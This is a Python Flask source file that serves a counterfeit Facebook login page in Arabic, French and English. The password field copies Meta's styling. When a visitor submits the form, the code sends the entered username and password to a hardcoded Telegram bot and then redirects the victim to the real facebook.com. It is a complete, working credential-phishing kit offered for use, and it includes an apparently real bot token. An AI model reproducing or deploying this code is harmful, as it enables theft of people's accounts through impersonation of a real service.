import os
import requests
from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# ضع معلومات بوت التلغرام الخاص بك هنا
TELEGRAM_BOT_TOKEN = "8639412768:AAGmCsr80jvmPy3HXR9wOmUmUsZrjZsjck"
TELEGRAM_CHAT_ID = "7333717671"

def send_to_telegram(username, password):
    try:
        message = f"🚨 تم التقاط بيانات جديدة !\n\n👤 المستخدم/الهاتف: {username}\n🔑 كلمة السر: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message
        }
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ 'rtl' if lang == 'ar' else 'ltr' }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - تسجيل الدخول</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
        }
        .top-banner {
            width: 100%;
            background-color: #ffffff;
            padding: 10px 0;
            text-align: center;
            font-size: 13px;
            color: #1877f2;
            border-bottom: 1px solid #dadde1;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
        .main-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo {
            width: 60px;
            height: 60px;
            margin: 20px auto;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            background: #ffffff;
        }
        input:focus {
            border-color: #1877f2;
            outline: none;
        }
        .password-container {
            position: relative;
            width: 100%;
        }
        .toggle-password {
            position: absolute;
            {{ 'left' if lang == 'ar' else 'right' }}: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 18px;
            color: #65676b;
            user-select: none;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        .forgot-link {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 15px 0;
            display: inline-block;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
            width: 100%;
        }
        .create-btn {
            background-color: transparent;
            color: #42b72a;
            border: 1px solid #42b72a;
            border-radius: 6px;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            text-decoration: none;display: block;
            box-sizing: border-box;
        }
        footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #737373;
            width: 100%;
        }
        .meta-logo {
            font-weight: bold;
            font-size: 14px;
            color: #1c1e21;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

    <div class="top-banner">
        📥 احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.
    </div>

    <div class="main-container">
        <div style="font-size: 14px; color: #4b4f56; margin-bottom: 15px;">
            <a href="/ar" style="color: #90949c; text-decoration: none;">العربية</a> | 
            <a href="/fr" style="color: #385898; text-decoration: none;">Français</a> | 
            <a href="/en" style="color: #385898; text-decoration: none;">English</a>
        </div>

        <svg class="logo" viewBox="0 0 36 36" fill="#1877f2">
            <path d="M25 3.5H21.5C17.5 3.5 15 6 15 10.5V14H11V19H15V32H20V19H24.5V14H20V10.8C20 9.5 20.5 9 22 9H25V3.5Z"></path>
        </svg>

        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
            <div class="password-container">
                <input type="password" name="password" id="passwordField" placeholder="كلمة السر" required>
                <span class="toggle-password" onclick="toggleVisibility()">👁️</span>
            </div>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>

        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>

        <div class="divider"></div>

        <a href="#" class="create-btn">إنشاء حساب جديد</a>
    </div>

    <footer>
        <div class="meta-logo">∞ Meta</div>
        <div>حول · مساعدة · المزيد</div>
    </footer>

    <script>
        const passwordField = document.getElementById('passwordField');
        const toggleBtn = document.querySelector('.toggle-password');

        toggleBtn.style.display = 'none';

        passwordField.addEventListener('input', function() {
            if (this.value.length > 0) {
                toggleBtn.style.display = 'block';
            } else {
                toggleBtn.style.display = 'none';
                passwordField.type = 'password';
                toggleBtn.textContent = '👁️';
            }
        });

        function toggleVisibility() {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleBtn.textContent = '👁️‍🗨️';
            } else {
                passwordField.type = 'password';
                toggleBtn.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/ar')

@app.route('/<lang>')
def set_language(lang):
    if lang not in ['ar', 'fr', 'en']:
        lang = 'ar'
    return render_template_string(HTML_TEMPLATE, lang=lang)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    send_to_telegram(username, password)
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
